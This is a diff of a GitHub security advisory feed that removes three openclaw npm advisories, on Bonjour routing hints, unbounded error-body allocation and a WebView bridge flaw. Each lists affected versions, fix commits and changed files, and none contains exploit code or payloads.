-        <link href="https://github.com/advisories/GHSA-rvqr-hrcc-j9vv"/>
-        <updated>2026-03-26T19:50:26.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Bonjour and DNS-SD TXT metadata could still steer CLI routing even when actual service resolution failed, allowing unresolved hints to influence the chosen target.</p>
-<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
-<ul>
-<li>Package: <code>openclaw</code> (npm)</li>
-<li>Affected: &lt; 2026.3.22</li>
-<li>Fixed: &gt;= 2026.3.22</li>
-<li>Latest released tag checked: <code>v2026.3.23-2</code> (<code>630f1479c44f78484dfa21bb407cbe6f171dac87</code>)</li>
-<li>Latest published npm version checked: <code>2026.3.23-2</code></li>
-</ul>
-<h2 id="fix-commits">Fix Commit(s)</h2>
-<ul>
-<li><code>deecf68b59a9b7eea978e40fd3c2fe543087b569</code></li>
-</ul>
-<h2 id="release-status">Release Status</h2>
-<p>The fix shipped in <code>v2026.3.22</code> and remains present in <code>v2026.3.23</code> and <code>v2026.3.23-2</code>.</p>
-<h2 id="code-level-confirmation">Code-Level Confirmation</h2>
-<ul>
-<li>src/infra/bonjour-discovery.ts now resolves and returns only concrete endpoints instead of falling back to unresolved TXT host and port hints.</li>
-<li>src/cli/gateway-cli/discover.ts consumes only the fail-closed resolved endpoint path.</li>
-</ul>
-<p>OpenClaw thanks @nexrin for reporting.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-rvqr-hrcc-j9vv">https://github.com/openclaw/openclaw/security/advisories/GHSA-rvqr-hrcc-j9vv</a></li>
-<li><a href="https://github.com/openclaw/openclaw/commit/deecf68b59a9b7eea978e40fd3c2fe543087b569">https://github.com/openclaw/openclaw/commit/deecf68b59a9b7eea978e40fd3c2fe543087b569</a></li>
-<li><a href="https://github.com/advisories/GHSA-rvqr-hrcc-j9vv">https://github.com/advisories/GHSA-rvqr-hrcc-j9vv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rvqr-hrcc-j9vv</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-26T19:50:24.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] OpenClaw: Remote media error responses could trigger unbounded memory allocation before failure]]></title>
-        <id>https://github.com/advisories/GHSA-4qwc-c7g9-4xcw</id>
-        <link href="https://github.com/advisories/GHSA-4qwc-c7g9-4xcw"/>
-        <updated>2026-03-26T19:50:08.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Remote media HTTP error bodies were read without a hard size cap before failure handling, allowing unbounded allocation on error responses.</p>
-<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
-<ul>
-<li>Package: <code>openclaw</code> (npm)</li>
-<li>Affected: &lt; 2026.3.22</li>
-<li>Fixed: &gt;= 2026.3.22</li>
-<li>Latest released tag checked: <code>v2026.3.23-2</code> (<code>630f1479c44f78484dfa21bb407cbe6f171dac87</code>)</li>
-<li>Latest published npm version checked: <code>2026.3.23-2</code></li>
-</ul>
-<h2 id="fix-commits">Fix Commit(s)</h2>
-<ul>
-<li><code>81445a901091a5d27ef0b56fceedbe4724566438</code></li>
-</ul>
-<h2 id="release-status">Release Status</h2>
-<p>The fix shipped in <code>v2026.3.22</code> and remains present in <code>v2026.3.23</code> and <code>v2026.3.23-2</code>.</p>
-<h2 id="code-level-confirmation">Code-Level Confirmation</h2>
-<ul>
-<li>src/media/fetch.ts now routes non-2xx failures through bounded prefix reads instead of buffering the whole error body.</li>
-<li>src/media/read-response-with-limit.ts enforces capped reads and truncates oversized snippets before surfacing failure text.</li>
-</ul>
-<p>OpenClaw thanks @YLChen-007 for reporting.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-4qwc-c7g9-4xcw">https://github.com/openclaw/openclaw/security/advisories/GHSA-4qwc-c7g9-4xcw</a></li>
-<li><a href="https://github.com/openclaw/openclaw/commit/81445a901091a5d27ef0b56fceedbe4724566438">https://github.com/openclaw/openclaw/commit/81445a901091a5d27ef0b56fceedbe4724566438</a></li>
-<li><a href="https://github.com/advisories/GHSA-4qwc-c7g9-4xcw">https://github.com/advisories/GHSA-4qwc-c7g9-4xcw</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4qwc-c7g9-4xcw</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-26T19:50:06.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] OpenClaw: Arbitrary code execution via unvalidated WebView JavascriptInterface]]></title>
-        <id>https://github.com/advisories/GHSA-cxmw-p77q-wchg</id>
-        <link href="https://github.com/advisories/GHSA-cxmw-p77q-wchg"/>
-        <updated>2026-03-26T19:30:56.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Android Canvas WebView pages from untrusted origins could invoke the JavascriptInterface bridge and inject instructions into the app.</p>
-<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
-<ul>
-<li>Package: <code>openclaw</code> (npm)</li>
-<li>Affected: &lt; 2026.3.22</li>
-<li>Fixed: &gt;= 2026.3.22</li>
-<li>Latest released tag checked: <code>v2026.3.23-2</code> (<code>630f1479c44f78484dfa21bb407cbe6f171dac87</code>)</li>
-<li>Latest published npm version checked: <code>2026.3.23-2</code></li>
-</ul>
-<h2 id="fix-commits">Fix Commit(s)</h2>
-<ul>
-<li><code>8b02ef133275be96d8aac2283100016c8a7f32e5</code></li>
-</ul>
-<h2 id="release-status">Release Status</h2>
-<p>The fix shipped in <code>v2026.3.22</code> and remains present in <code>v2026.3.23</code> and <code>v2026.3.23-2</code>.</p>
-<h2 id="code-level-confirmation">Code-Level Confirmation</h2>
-<ul>
-<li>apps/android/app/src/main/java/ai/openclaw/app/ui/CanvasScreen.kt now snapshots page origin and rejects untrusted bridge calls.</li>
-<li>apps/android/app/src/main/java/ai/openclaw/app/node/CanvasActionTrust.kt centralizes trusted origin and path validation for the bridge.</li>
-</ul>
-<p>OpenClaw thanks @cyjhhh for reporting.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-cxmw-p77q-wchg">https://github.com/openclaw/openclaw/security/advisories/GHSA-cxmw-p77q-wchg</a></li>
-<li><a href="https://github.com/openclaw/openclaw/commit/630f1479c44f78484dfa21bb407cbe6f171dac87">https://github.com/openclaw/openclaw/commit/630f1479c44f78484dfa21bb407cbe6f171dac87</a></li>
-<li><a href="https://github.com/advisories/GHSA-cxmw-p77q-wchg">https://github.com/advisories/GHSA-cxmw-p77q-wchg</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cxmw-p77q-wchg</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-26T19:30:52.000Z</published>
     </entry>
 </feed>
